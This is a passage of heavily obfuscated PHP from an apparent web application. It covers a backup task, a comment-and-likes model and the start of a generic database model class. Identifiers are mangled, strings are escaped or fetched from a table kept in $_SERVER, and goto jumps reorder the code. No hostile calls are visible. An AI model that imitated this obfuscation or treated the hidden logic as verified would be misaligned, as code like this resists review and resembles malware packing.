$this->process(); foreach ($ù¬  ÏĞ as $‰»É„üÀ) { if ($‰»É„üÀ) { return Task::restart($‰»É„üÀ[$ùÊä²Ğ[407]]); } } $Ï¾“ô»¿ = new Backup(); $İú‹€­ = $Ï¾“ô»¿->db(); if ($İú‹€­) { $İú‹€­ = $Ï¾“ô»¿->dbFile(); if ($İú‹€­ && $é¦ç·•[$ùÊä²Ğ[750]] == $ùÊä²Ğ[197]) { $İú‹€­ = $Ï¾“ô»¿->file(); } } Backup::set(array($ùÊä²Ğ[745] => 1, $ùÊä²Ğ[506] => time())); return !0; } public function process() { $ÃÏ²è‘à =& $_SERVER[ĞÆÏ¡Îª]; $ğ‰ï’î¶ = array($ÃÏ²è‘à[753] => Task::get($ÃÏ²è‘à[774]), $ÃÏ²è‘à[757] => Task::get($ÃÏ²è‘à[795]), $ÃÏ²è‘à[199] => Task::get($ÃÏ²è‘à[804])); $Ğè®Õöû = !1; foreach ($ğ‰ï’î¶ as &$ÁÁ¬ÎœÚ) { if ($Ğè®Õöû) { $ÁÁ¬ÎœÚ = !1; continue; } if ($ÁÁ¬ÎœÚ) { $«±…¸ = intval(_get($ÁÁ¬ÎœÚ, $ÃÏ²è‘à[1652], 0)); if (time() - $«±…¸ > 7200) { Task::kill($ÁÁ¬ÎœÚ[$ÃÏ²è‘à[407]]); $Ğè®Õöû = !0; $ÁÁ¬ÎœÚ = !1; } } } return $ğ‰ï’î¶; } public function restore() { $ØÖß¢îÙ =& $_SERVER[ĞÆÏ¡Îª]; ActionCall($ØÖß¢îÙ[1051], !0, 1); ActionCall($ØÖß¢îÙ[1051], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\x65\x6e\164"; protected $tableMeta = array("\164\141\142\154\145\116\x61\x6d\145" => "\x63\x6f\x6d\155\x65\156\164\x5f\155\x65\164\141", "\155\145\x74\x61\106\151\x65\154\x64" => "\x63\x6f\155\x6d\145\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¨³£ç£) { $ûäÜÏİ© =& $_SERVER[ĞÆÏ¡Îª]; if ($¨³£ç£[$ûäÜÏİ©[1848]]) { $åÛ²óÂ = $this->where(array($ûäÜÏİ©[1849] => $¨³£ç£[$ûäÜÏİ©[1848]]))->find(); if (!$åÛ²óÂ || $åÛ²óÂ[$ûäÜÏİ©[420]] != $¨³£ç£[$ûäÜÏİ©[420]] || $åÛ²óÂ[$ûäÜÏİ©[514]] != $¨³£ç£[$ûäÜÏİ©[514]]) { return !1; } $this->where(array($ûäÜÏİ©[1849] => $¨³£ç£[$ûäÜÏİ©[1848]]))->setAdd($ûäÜÏİ©[1850], 1); } $¨³£ç£[$ûäÜÏİ©[1851]] = 0; $¨³£ç£[$ûäÜÏİ©[1850]] = 0; $¨³£ç£[$ûäÜÏİ©[745]] = 1; return $this->add($¨³£ç£); } public function commentCount($½µñÅÎ, $Ÿ¡·šî‡, $üŸòÖç¬ = false) { $ÀŒ‘»Ÿó =& $_SERVER[ĞÆÏ¡Îª]; if (!$½µñÅÎ) { return array(); } if (is_string($½µñÅÎ) || is_int($½µñÅÎ)) { $½µñÅÎ = array($½µñÅÎ); } $‹¹ğÌßò = array($ÀŒ‘»Ÿó[514], $ÀŒ‘»Ÿó[1852] => $ÀŒ‘»Ÿó[509]); $¸íÓ„— = array($ÀŒ‘»Ÿó[514] => array($ÀŒ‘»Ÿó[7], $½µñÅÎ), $ÀŒ‘»Ÿó[420] => $Ÿ¡·šî‡); if ($üŸòÖç¬) { $¸íÓ„—[$ÀŒ‘»Ÿó[1647]] = $üŸòÖç¬; } $¨‹Ò¾› = $this->field($‹¹ğÌßò)->where($¸íÓ„—)->group($ÀŒ‘»Ÿó[514])->select(); return array_to_keyvalue($¨‹Ò¾›, $ÀŒ‘»Ÿó[514], $ÀŒ‘»Ÿó[509]); } public function starTarget($ÀùïïüÍ, $ÖÌ×ê¦¾) { $é™¶¸¶ =& $_SERVER[ĞÆÏ¡Îª]; $—ˆ¹‘Ã… = $ÀùïïüÍ + self::TYPE_STAR_OFFSET; $òÀÔºº£ = array($é™¶¸¶[1647] => USER_ID, $é™¶¸¶[420] => $—ˆ¹‘Ã…, $é™¶¸¶[514] => $ÖÌ×ê¦¾); $£÷ĞŒ‚¹ = $this->where($òÀÔºº£)->find(); if ($£÷ĞŒ‚¹) { return $this->where(array($é™¶¸¶[407] => $£÷ĞŒ‚¹[$é™¶¸¶[407]]))->delete(); } $õÇâ›Ì• = array($é™¶¸¶[1848] => 0, $é™¶¸¶[1647] => USER_ID, $é™¶¸¶[745] => 1, $é™¶¸¶[750] => $é™¶¸¶[12], $é™¶¸¶[420] => $—ˆ¹‘Ã…, $é™¶¸¶[514] => $ÖÌ×ê¦¾, $é™¶¸¶[1851] => 0, $é™¶¸¶[1850] => 0); return $this->add($õÇâ›Ì•); } public function starTargetCount($Ô‡È‡÷ğ, $èÂ‰ú›ˆ) { $øĞĞãœ„ =& $_SERVER[ĞÆÏ¡Îª]; $òŒô¼ÊÇ = $èÂ‰ú›ˆ + self::TYPE_STAR_OFFSET; $’¦æ©­“ = $this->commentCount($Ô‡È‡÷ğ, $òŒô¼ÊÇ); $Ù’õ€ ş = $this->commentCount($Ô‡È‡÷ğ, $òŒô¼ÊÇ, USER_ID); return array($øĞĞãœ„[1853] => $’¦æ©­“, $øĞĞãœ„[1854] => $Ù’õ€ ş); } public function starTargetUserList($óƒãÇ¼Ñ, $Ì Ø™) { $ö‡£¨ =& $_SERVER[ĞÆÏ¡Îª]; $Í”ºãÛ¢ = $óƒãÇ¼Ñ + self::TYPE_STAR_OFFSET; $Ïû¬À¥™ = array($ö‡£¨[514] => $Ì Ø™, $ö‡£¨[420] => $Í”ºãÛ¢); $‹Ş½®¿Æ = $this->where($Ïû¬À¥™)->count(); $˜ÂĞ¼¹Ì = array($ö‡£¨[264] => $‹Ş½®¿Æ, $ö‡£¨[1855] => array()); if (!$‹Ş½®¿Æ) { return $˜ÂĞ¼¹Ì; } $Øû«íİ = $this->field($ö‡£¨[1647])->where($Ïû¬À¥™)->limit(500)->select(); $Øû«íİ = array_to_keyvalue($Øû«íİ, $ö‡£¨[12], $ö‡£¨[1647]); $˜ÂĞ¼¹Ì[$ö‡£¨[1855]] = Model($ö‡£¨[522])->userListInfo($Øû«íİ); return $˜ÂĞ¼¹Ì; } public function prasiseUserList($Î©¶ùÀ¬) { $îé¹¶·æ =& $_SERVER[ĞÆÏ¡Îª]; $ü“÷óâğ = array($îé¹¶·æ[1856] => $Î©¶ùÀ¬); $¹™üŞš£ = $this->where($ü“÷óâğ)->find(); $ŸƒÒµï = _get($¹™üŞš£, $îé¹¶·æ[1851], 0); $½ıµö¾¿ = array($îé¹¶·æ[264] => $ŸƒÒµï, $îé¹¶·æ[1855] => array()); if (!$ŸƒÒµï) { return $½ıµö¾¿; } $ò‘Ó‹Ù‰ = Model($îé¹¶·æ[1857])->field($îé¹¶·æ[1647])->where($ü“÷óâğ)->limit(500)->select(); $ò‘Ó‹Ù‰ = array_to_keyvalue($ò‘Ó‹Ù‰, $îé¹¶·æ[12], $îé¹¶·æ[1647]); $½ıµö¾¿[$îé¹¶·æ[1855]] = Model($îé¹¶·æ[522])->userListInfo($ò‘Ó‹Ù‰); return $½ıµö¾¿; } public function remove($Î¼´ÒŒÌ) { $ÃÇ—éÃ =& $_SERVER[ĞÆÏ¡Îª]; $³ÃäÉÆ = array($ÃÇ—éÃ[1849] => $Î¼´ÒŒÌ); $˜±›ÖØ€ = $this->where($³ÃäÉÆ)->find(); if ($˜±›ÖØ€[$ÃÇ—éÃ[1848]]) { $this->where(array($ÃÇ—éÃ[1849] => $˜±›ÖØ€[$ÃÇ—éÃ[1848]]))->setAdd($ÃÇ—éÃ[1850], -1); } return $this->where($³ÃäÉÆ)->delete(); } public function edit($Ä¯˜Ûğ°, $³ÊÚìï) { $Æë°¯œî =& $_SERVER[ĞÆÏ¡Îª]; $×ÚÖˆ = array($Æë°¯œî[1849] => $Ä¯˜Ûğ°); return $this->where($×ÚÖˆ)->save(array($Æë°¯œî[1858] => $³ÊÚìï)); } public function prasise($¯¨‚Ìßî) { $Êè¾µéõ =& $_SERVER[ĞÆÏ¡Îª]; $İÍÊÒğ = Model($Êè¾µéõ[1859]); $ù«ııûÇ = array($Êè¾µéõ[1849] => $¯¨‚Ìßî, $Êè¾µéõ[1638] => USER_ID); $€ıùĞ = $İÍÊÒğ->where($ù«ııûÇ)->find(); if (!$€ıùĞ) { $İÍÊÒğ->add($ù«ııûÇ); $„äÏ­„± = $this->where(array($Êè¾µéõ[1849] => $¯¨‚Ìßî))->setAdd($Êè¾µéõ[1851], 1); } else { $İÍÊÒğ->where($ù«ııûÇ)->delete(); $„äÏ­„± = $this->where(array($Êè¾µéõ[1849] => $¯¨‚Ìßî))->setAdd($Êè¾µéõ[1851], -1); } return $„äÏ­„±; } public function targetInfo($Æ¨¤¦ê«, $İ…²£Áı) { $ÃŞ¤‘° =& $_SERVER[ĞÆÏ¡Îª]; $ŠõÃ¥öƒ = array($ÃŞ¤‘°[595] => $Æ¨¤¦ê«, $ÃŞ¤‘°[596] => $İ…²£Áı); $Ç€£Öø˜ = $this->where($ŠõÃ¥öƒ)->count(); $¸¬âøò = "\122\x49\x47\x48\124\x20\x4a\x4f\111\116\40{$this->tablePrefix}\143\x6f\x6d\155\145\156\x74\x5f\x70\x72\141\x69\163\x65\40\x73\x74\141\x72\x20\x6f\156\40\x63\x6f\155\x6d\145\x6e\164\x2e\143\x6f\x6d\x6d\x65\x6e\164\x49\104\40\x3d\x20\163\164\141\x72\x2e\143\x6f\x6d\x6d\x65\156\164\x49\104"; $Ø™–ø² = $this->alias($ÃŞ¤‘°[363])->where($ŠõÃ¥öƒ)->join($¸¬âøò, $ÃŞ¤‘°[1860])->count(); $µĞ´à¯ = array($ÃŞ¤‘°[1861] => $Ç€£Öø˜, $ÃŞ¤‘°[1862] => $Ø™–ø²); return $µĞ´à¯; } public function listData($ğßæÀ¦ë) { $ªÁËÒ‘° =& $_SERVER[ĞÆÏ¡Îª]; if (isset($ğßæÀ¦ë[$ªÁËÒ‘°[1863]])) { if ($ğßæÀ¦ë[$ªÁËÒ‘°[1863]]) { $ğßæÀ¦ë[$ªÁËÒ‘°[1856]] = array($ªÁËÒ‘°[1005], intval($ğßæÀ¦ë[$ªÁËÒ‘°[1863]])); } unset($ğßæÀ¦ë[$ªÁËÒ‘°[1863]]); } if (isset($ğßæÀ¦ë[$ªÁËÒ‘°[1864]])) { if ($ğßæÀ¦ë[$ªÁËÒ‘°[1864]]) { $ğßæÀ¦ë[$ªÁËÒ‘°[1856]] = array($ªÁËÒ‘°[1002], intval($ğßæÀ¦ë[$ªÁËÒ‘°[1864]])); } unset($ğßæÀ¦ë[$ªÁËÒ‘°[1864]]); } return $this->_listData($ğßæÀ¦ë); } private function _listData($Ä¬Ìè«©) { $òÊ¤‘ =& $_SERVER[ĞÆÏ¡Îª]; $Óª¼÷™ = $this->where($Ä¬Ìè«©)->_makeOrder()->selectPage(100); $this->_listAppendParent($Óª¼÷™[$òÊ¤‘[378]]); $this->_listAppendUser($Óª¼÷™[$òÊ¤‘[378]]); $this->_listAppendMeta($Óª¼÷™[$òÊ¤‘[378]]); return $Óª¼÷™; } private function _makeOrder() { $Õ¢Â‹©¸ =& $_SERVER[ĞÆÏ¡Îª]; $‡¦³úä¯ = array($Õ¢Â‹©¸[1851], $Õ¢Â‹©¸[1850], $Õ¢Â‹©¸[200]); $™Ã¿Œ = Input::get($Õ¢Â‹©¸[466], $Õ¢Â‹©¸[7], $Õ¢Â‹©¸[432], $‡¦³úä¯); $„Ó¾»û® = Input::get($Õ¢Â‹©¸[467], $Õ¢Â‹©¸[7], $Õ¢Â‹©¸[1640], array($Õ¢Â‹©¸[1865], $Õ¢Â‹©¸[462])); $‚²ÕÀ»Ì = $™Ã¿Œ . $Õ¢Â‹©¸[53] . $„Ó¾»û®; return $this->order($‚²ÕÀ»Ì); } private function _listAppendParent(&$óüìğêá) { $á…÷Š¢÷ =& $_SERVER[ĞÆÏ¡Îª]; $ıœ¿ëÂ’ = array_unique(array_to_keyvalue($óüìğêá, $á…÷Š¢÷[12], $á…÷Š¢÷[1848])); $ıœ¿ëÂ’ = array_remove_value($ıœ¿ëÂ’, $á…÷Š¢÷[197]); if (!$ıœ¿ëÂ’) { return; } $ÊÍ‡‚§ = $this->where(array($á…÷Š¢÷[1849] => array($á…÷Š¢÷[7], $ıœ¿ëÂ’)))->select(); $ÊÍ‡‚§ = array_to_keyvalue($ÊÍ‡‚§, $á…÷Š¢÷[1856]); foreach ($óüìğêá as &$¬·‡¨»Ï) { if (isset($ÊÍ‡‚§[$¬·‡¨»Ï[$á…÷Š¢÷[1848]]])) { $¬·‡¨»Ï[$á…÷Š¢÷[1866]] = $ÊÍ‡‚§[$¬·‡¨»Ï[$á…÷Š¢÷[1848]]]; } } unset($¬·‡¨»Ï); } private function _listAppendUser(&$ë•èù™Í) { $ËÛöÇı =& $_SERVER[ĞÆÏ¡Îª]; $§«éÀ‘´ = array_unique(array_to_keyvalue($ë•èù™Í, $ËÛöÇı[12], $ËÛöÇı[1647])); $§«éÀ‘´ = array_remove_value($§«éÀ‘´, $ËÛöÇı[197]); if (count($§«éÀ‘´) == 0) { return; } foreach ($ë•èù™Í as $ö‡ï«‰ú) { if (isset($ö‡ï«‰ú[$ËÛöÇı[1866]])) { $§«éÀ‘´[] = $ö‡ï«‰ú[$ËÛöÇı[1866]][$ËÛöÇı[1647]]; } } $Èƒ³¾»Ğ = Model($ËÛöÇı[544])->userListInfo($§«éÀ‘´); foreach ($ë•èù™Í as &$ö‡ï«‰ú) { $ö‡ï«‰ú[$ËÛöÇı[609]] = $Èƒ³¾»Ğ[$ö‡ï«‰ú[$ËÛöÇı[1647]]]; if (isset($ö‡ï«‰ú[$ËÛöÇı[1866]])) { $ö‡ï«‰ú[$ËÛöÇı[1866]][$ËÛöÇı[609]] = $Èƒ³¾»Ğ[$ö‡ï«‰ú[$ËÛöÇı[1866]][$ËÛöÇı[1647]]]; } } unset($ö‡ï«‰ú); } private function _listAppendMeta(&$··‹ã£¶) { $¦Ğêš•œ =& $_SERVER[ĞÆÏ¡Îª]; $Ø¸ÄË§ = array_unique(array_to_keyvalue($··‹ã£¶, $¦Ğêš•œ[12], $¦Ğêš•œ[1856])); $Ø¸ÄË§ = array_remove_value($Ø¸ÄË§, $¦Ğêš•œ[197]); if (!$Ø¸ÄË§) { return; } foreach ($··‹ã£¶ as $–­šŠğå) { if (isset($–­šŠğå[$¦Ğêš•œ[1866]])) { $Ø¸ÄË§[] = $–­šŠğå[$¦Ğêš•œ[1866]][$¦Ğêš•œ[1856]]; } } $•‘ÉÂ¬ = $this->metaList($Ø¸ÄË§); if (!$•‘ÉÂ¬) { return !1; } foreach ($··‹ã£¶ as &$–­šŠğå) { $–­šŠğå[$¦Ğêš•œ[475]] = $•‘ÉÂ¬[$–­šŠğå[$¦Ğêš•œ[1856]]]; if (isset($–­šŠğå[$¦Ğêš•œ[1866]])) { $–­šŠğå[$¦Ğêš•œ[1866]][$¦Ğêš•œ[475]] = $•‘ÉÂ¬[$–­šŠğå[$¦Ğêš•œ[1866]][$¦Ğêš•œ[1856]]]; } } unset($–­šŠğå); } private function metaList($Ê™¤Æ†à) { $üºğ¨§Ú =& $_SERVER[ĞÆÏ¡Îª]; if (!$Ê™¤Æ†à) { return array(); } $»…ÚˆÂ® = array($üºğ¨§Ú[1856] => array($üºğ¨§Ú[7], $Ê™¤Æ†à)); $¢¾×¨ñ = Model($üºğ¨§Ú[1867])->where($»…ÚˆÂ®)->select(); $¢¾×¨ñ = array_to_keyvalue_group($¢¾×¨ñ, $üºğ¨§Ú[1856]); foreach ($¢¾×¨ñ as $Å¦¶ˆ¡ => $†¬ù´æ·) { $©ˆƒÕğ› = array(); foreach ($†¬ù´æ· as $Ü·¾„ä¯) { $©ˆƒÕğ›[$Ü·¾„ä¯[$üºğ¨§Ú[94]]] = $Ü·¾„ä¯[$üºğ¨§Ú[383]]; } $¢¾×¨ñ[$Å¦¶ˆ¡] = $©ˆƒÕğ›; } return $¢¾×¨ñ ? $¢¾×¨ñ : array(); } } goto cîËÜ÷öõ; B¨…æ“: define($_SERVER[ĞÆÏ¡Îª][252], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\x65", "\157\162\144\145\x72", "\x61\154\x69\141\163", "\x68\141\x76\x69\x6e\147", "\147\162\x6f\165\x70", "\154\x6f\143\x6b", "\x64\x69\163\164\x69\x6e\x63\164", "\141\165\x74\157", "\146\x69\154\x74\145\162", "\x76\x61\154\151\144\x61\x74\145", "\x72\145\163\x75\x6c\164", "\x62\x69\156\x64", "\164\157\153\x65\156"); public function __construct($ØÔËÎ…„ = '', $ì’˜Ëİ = '', $å¤Šá…‡ = '') { $Èæ˜–»À =& $_SERVER[ĞÆÏ¡Îª]; $this->_initialize(); if (!empty($ØÔËÎ…„)) { if (strpos($ØÔËÎ…„, $Èæ˜–»À[10])) { list($this->dbName, $this->name) = explode($Èæ˜–»À[10], $ØÔËÎ…„); } else { $this->name = $ØÔËÎ…„; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ì’˜Ëİ)) { $this->tablePrefix = $Èæ˜–»À[12]; } elseif ($Èæ˜–»À[12] != $ì’˜Ëİ) { $this->tablePrefix = $ì’˜Ëİ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Èæ˜–»À[253]); } $this->db(0, empty($this->connection) ? $å¤Šá…‡ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ß“Æñîá =& $_SERVER[ĞÆÏ¡Îª]; if (empty($this->fields)) { if (think_config($ß“Æñîá[254])) { $ÂÏßÌç· = $this->dbName ? $this->dbName : think_config($ß“Æñîá[255]); $ÖÊ“·Õ— = think_var_cache($ß“Æñîá[256] . strtolower(get_path_this($ÂÏßÌç·) . $ß“Æñîá[10] . $this->name)); if ($ÖÊ“·Õ—) { $ù†ì‚Òí = think_config($ß“Æñîá[257]); if (empty($ù†ì‚Òí) || $ÖÊ“·Õ—[$ß“Æñîá[258]] == $ù†ì‚Òí) { $this->fields = $ÖÊ“·Õ—; return; } } } $this->flush(); } } public function flush() { $œ‰Æµ =& $_SERVER[ĞÆÏ¡Îª]; $this->db->setModel($this->name); $ÚÙÕ«¬» = $this->db->getFields($this->getTableName()); if (!$ÚÙÕ«¬») { return !1; } $this->fields = array_keys($ÚÙÕ«¬»); $this->fields[$œ‰Æµ[259]] = !1; foreach ($ÚÙÕ«¬» as $Ìİ²ğô¹ => $ªÕæ´À) { $ªå©¿¿Í[$Ìİ²ğô¹] = $ªÕæ´À[$œ‰Æµ[33]]; if ($ªÕæ´À[$œ‰Æµ[39]]) { $this->fields[$œ‰Æµ[260]] = $Ìİ²ğô¹; if ($ªÕæ´À[$œ‰Æµ[42]]) { $this->fields[$œ‰Æµ[259]] = !0; } } } $this->fields[$œ‰Æµ[261]] = $ªå©¿¿Í; if (think_config($œ‰Æµ[257])) { $this->fields[$œ‰Æµ[258]] = think_config($œ‰Æµ[257]); } if (think_config($œ‰Æµ[254])) { $˜–¾Ä´» = $this->dbName ? $this->dbName : think_config($œ‰Æµ[255]); think_var_cache($œ‰Æµ[256] . strtolower(get_path_this($˜–¾Ä´») . $œ‰Æµ[10] . $this->name), $this->fields); } } public function switchModel($ã™¢¢›ø, $…€î‘¾— = array()) { $´‘ˆÊ­Å =& $_SERVER[ĞÆÏ¡Îª]; $“˜¬×ÄÃ = ucwords(strtolower($ã™¢¢›ø)) . $´‘ˆÊ­Å[262]; if (!class_exists($“˜¬×ÄÃ)) { think_exception($“˜¬×ÄÃ . think_lang($´‘ˆÊ­Å[263])); } $this->_extModel = new $“˜¬×ÄÃ($this->name); if (!empty($…€î‘¾—)) { foreach ($…€î‘¾— as $ä¿æ“¸Ê) { $this->_extModel->setProperty($ä¿æ“¸Ê, $this->{$ä¿æ“¸Ê}); } } return $this->_extModel; } public function __set($ûóü©û, $ÊÆÍí†) { $this->data[$ûóü©û] = $ÊÆÍí†; } public function __get($Àˆ‰ØãŠ) { return isset($this->data[$Àˆ‰ØãŠ]) ? $this->data[$Àˆ‰ØãŠ] : null; } public function __isset($‰Êí³–å) { return isset($this->data[$‰Êí³–å]); } public function __unset($î‚‡ğ¹Ü) { unset($this->data[$î‚‡ğ¹Ü]); } public function __call($˜Ç¡êµŠ, $”Í®õĞ) { $Ãç³—¸ò =& $_SERVER[ĞÆÏ¡Îª]; if (in_array(strtolower($˜Ç¡êµŠ), $this->methods, !0)) { $this->options[strtolower($˜Ç¡êµŠ)] = $”Í®õĞ[0]; return $this; } elseif (in_array(strtolower($˜Ç¡êµŠ), array($Ãç³—¸ò[264], $Ãç³—¸ò[265], $Ãç³—¸ò[266], $Ãç³—¸ò[267], $Ãç³—¸ò[268]), !0)) { $Úöò×Ê = isset($”Í®õĞ[0]) ? $”Í®õĞ[0] : $Ãç³—¸ò[188]; $Úöò×Ê = $this->db->parseKey($Úöò×Ê); return $this->getField(strtoupper($˜Ç¡êµŠ) . $Ãç³—¸ò[269] . $Úöò×Ê . $Ãç³—¸ò[270] . $˜Ç¡êµŠ, $Ãç³—¸ò[264]); } elseif (strtolower(substr($˜Ç¡êµŠ, 0, 5)) == $Ãç³—¸ò[271]) { $Úöò×Ê = think_parse_name(substr($˜Ç¡êµŠ, 5)); $½Óş©íø[$Úöò×Ê] = $”Í®õĞ[0]; return $this->where($½Óş©íø)->find(); } elseif (strtolower(substr($˜Ç¡êµŠ, 0, 10)) == $Ãç³—¸ò[272]) { $½Ê´øë = think_parse_name(substr($˜Ç¡êµŠ, 10)); $½Óş©íø[$½Ê´øë] = $”Í®õĞ[0]; return $this->where($½Óş©íø)->getField($”Í®õĞ[1]); } elseif (isset($this->_scope[$˜Ç¡êµŠ])) { return $this->scope($˜Ç¡êµŠ, $”Í®õĞ[0]); } elseif (method_exists($this, $˜Ç¡êµŠ)) { array_unshift($”Í®õĞ, $˜Ç¡êµŠ); return call_user_func_array(array($this, $Ãç³—¸ò[273]), $”Í®õĞ); } else { return call_user_func_array(array(parent, $˜Ç¡êµŠ), $”Í®õĞ); } } protected function call() { $Ê¨‡ÍüÈ =& $_SERVER[ĞÆÏ¡Îª]; $äœ­©ıï = func_get_args(); $·òöÓñ– = array_shift($äœ­©ıï); $ˆ¯«Ó× = $·òöÓñ–; if (is_array($·òöÓñ–)) { $ˆ¯«Ó× = $·òöÓñ–[1]; $·òöÓñ– = $·òöÓñ–[0]; } $š™æ±”Ö = count($äœ­©ıï) - 1; if (isset($äœ­©ıï[$š™æ±”Ö]) && $äœ­©ıï[$š™æ±”Ö] === $·òöÓñ–) { think_exception(__CLASS__ . $Ê¨‡ÍüÈ[4] . $·òöÓñ– . think_lang($Ê¨‡ÍüÈ[274])); return; } $äœ­©ıï[] = $·òöÓñ–; if (method_exists($this, $Ê¨‡ÍüÈ[275])) { $ËƒŞ„  = call_user_func_array(array($this, $Ê¨‡ÍüÈ[276]), array($ˆ¯«Ó×, $äœ­©ıï)); if (!is_null($ËƒŞ„ ) && $ËƒŞ„  !== !1) { return $ËƒŞ„ ; } } $Ùú™œâ® = call_user_func_array(array($this, $·òöÓñ–), $äœ­©ıï); if (method_exists($this, $Ê¨‡ÍüÈ[277])) { $ËƒŞ„  = call_user_func_array(array($this, $Ê¨‡ÍüÈ[278]), array($ˆ¯«Ó×, $äœ­©ıï, $Ùú™œâ®)); if ($ËƒŞ„ ) { return $ËƒŞ„ ; } } return $Ùú™œâ®; } protected function _initialize() { } protected function _facade($òœşË ‘) { $éĞşÏé =& $_SERVER[ĞÆÏ¡Îª]; if (!empty($this->fields)) { foreach ($òœşË ‘ as $½±¡ñ«á => $‰ˆ—à Å) { if (is_array($this->fields) && !in_array($½±¡ñ«á, $this->fields, !0)) { unset($òœşË ‘[$½±¡ñ«á]); } elseif (is_scalar($‰ˆ—à Å)) { $this->_parseType($òœşË ‘, $½±¡ñ«á); } } } if (!empty($this->options[$éĞşÏé[279]])) { $òœşË ‘ = array_map($this->options[$éĞşÏé[279]], $òœşË ‘); unset($this->options[$éĞşÏé[279]]); } $this->_beforeWrite($òœşË ‘); return $òœşË ‘; } protected function _beforeWrite(&$ÙçøÏå„) { } public function add($ùÁ§â¯ì = '', $¡ Ã°—ƒ = array(), $Ê ÜÜÑü = false) { if (empty($ùÁ§â¯ì)) { if (!empty($this->data)) { $ùÁ§â¯ì = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ĞÆÏ¡Îª][280]); return !1; } } $¡ Ã°—ƒ = $this->_parseOptions($¡ Ã°—ƒ); $ùÁ§â¯ì = $this->_facade($ùÁ§â¯ì); if (!1 === $this->_beforeInsert($ùÁ§â¯ì, $¡ Ã°—ƒ)) { return !1; } $ÅŒÚÜµ¶ = $this->db->insert($ùÁ§â¯ì, $¡ Ã°—ƒ, $Ê ÜÜÑü); if (!1 !== $ÅŒÚÜµ¶) { $È¶Ë˜Â¸ = $this->getLastInsID(); if ($È¶Ë˜Â¸) { $ùÁ§â¯ì[$this->getPk()] = $È¶Ë˜Â¸; $this->_after_insert($ùÁ§â¯ì, $¡ Ã°—ƒ); return $È¶Ë˜Â¸; } $this->_after_insert($ùÁ§â¯ì, $¡ Ã°—ƒ); } return $ÅŒÚÜµ¶; } protected function _beforeInsert(&$£íÁ€ï, $êü²“ï¡) { } protected function _after_insert($Ô‡ÀÜè±, $ì¸‹ïª£) { } public function addAll($ÆòËîÛİ, $ ™î¬å = array(), $óÛ… = false) { $±˜†ÁÕ =& $_SERVER[ĞÆÏ¡Îª]; if (empty($ÆòËîÛİ)) { $this->error = think_lang($±˜†ÁÕ[280]); return !1; } $ ™î¬å = $this->_parseOptions($ ™î¬å); foreach ($ÆòËîÛİ as $òöÕ‰ => $Ã‰ÃÕ‰¦) { $ÆòËîÛİ[$òöÕ‰] = $this->_facade($Ã‰ÃÕ‰¦); } if (method_exists($this->db, $±˜†ÁÕ[281])) { $‰¾¿“¾¸ = $this->db->insertAll($ÆòËîÛİ, $ ™î¬å, $óÛ…); } else { $this->startTrans(); foreach ($ÆòËîÛİ as $òöÕ‰ => $Ã‰ÃÕ‰¦) { $‰¾¿“¾¸ = $this->db->insert($Ã‰ÃÕ‰¦, $ ™î¬å, $óÛ…); } $this->commit(); } if (!1 !== $‰¾¿“¾¸) { $Éú²…÷Ş = $this->getLastInsID(); if ($Éú²…÷Ş) { return $Éú²…÷Ş; } } return $‰¾¿“¾¸; } public function selectAdd($è¤±Í‰ê = '', $Ùëû‹× = '', $ÅÊü³Š½ = array()) { $Î›Ä¾… =& $_SERVER[ĞÆÏ¡Îª]; $ÅÊü³Š½ = $this->_parseOptions($ÅÊü³Š½); if (!1 === ($ş™ğªÏ˜ = $this->db->selectInsert($è¤±Í‰ê ? $è¤±Í‰ê : $ÅÊü³Š½[$Î›Ä¾…[282]], $Ùëû‹× ? $Ùëû‹× : $this->getTableName(), $ÅÊü³Š½))) { $this->error = think_lang($Î›Ä¾…[283]); return !1; } else { return $ş™ğªÏ˜; } } public function save($”û—‚êí = '', $Ì“ŞÀ¡ = array()) { $àŒôêû =& $_SERVER[ĞÆÏ¡Îª]; if (empty($”û—‚êí)) { if (!empty($this->data)) { $”û—‚êí = $this->data; $this->data = array(); } else { $this->error = think_lang($àŒôêû[280]); return !1; } } $”û—‚êí = $this->_facade($”û—‚êí); $Ì“ŞÀ¡ = $this->_parseOptions($Ì“ŞÀ¡); $ıûÄŞ’Ø = $this->getPk(); if (!isset($Ì“ŞÀ¡[$àŒôêû[284]])) { if (isset($”û—‚êí[$ıûÄŞ’Ø])) { $ºÅŒº³[$ıûÄŞ’Ø] = $”û—‚êí[$ıûÄŞ’Ø]; $Ì“ŞÀ¡[$àŒôêû[284]] = $ºÅŒº³; unset($”û—‚êí[$ıûÄŞ’Ø]); } else { $this->error = think_lang($àŒôêû[283]); return !1; } } if (is_array($Ì“ŞÀ¡[$àŒôêû[284]]) && isset($Ì“ŞÀ¡[$àŒôêû[284]][$ıûÄŞ’Ø])) { $Òí‚‹³˜ = $Ì“ŞÀ¡[$àŒôêû[284]][$ıûÄŞ’Ø]; } if (!1 === $this->_beforeUpdate($”û—‚êí, $Ì“ŞÀ¡)) { return !1; } $íÉéÅœ” = $this->db->update($”û—‚êí, $Ì“ŞÀ¡); if (!1 !== $íÉéÅœ”) { if (isset($Òí‚‹³˜)) { $”û—‚êí[$ıûÄŞ’Ø] = $Òí‚‹³˜; } $this->_afterUpdate($”û—‚êí, $Ì“ŞÀ¡); } return $íÉéÅœ”; } protected function _beforeUpdate(&$àü½Ñô, $Ñ¯ˆõ²) { } protected function _afterUpdate($ôñ‚²øê, $ßˆä‰µñ) { } public function delete($§öãèÑ = array()) { $ÍÀØ´é¡ =& $_SERVER[ĞÆÏ¡Îª]; if (empty($§öãèÑ) && empty($this->options[$ÍÀØ´é¡[284]])) { if 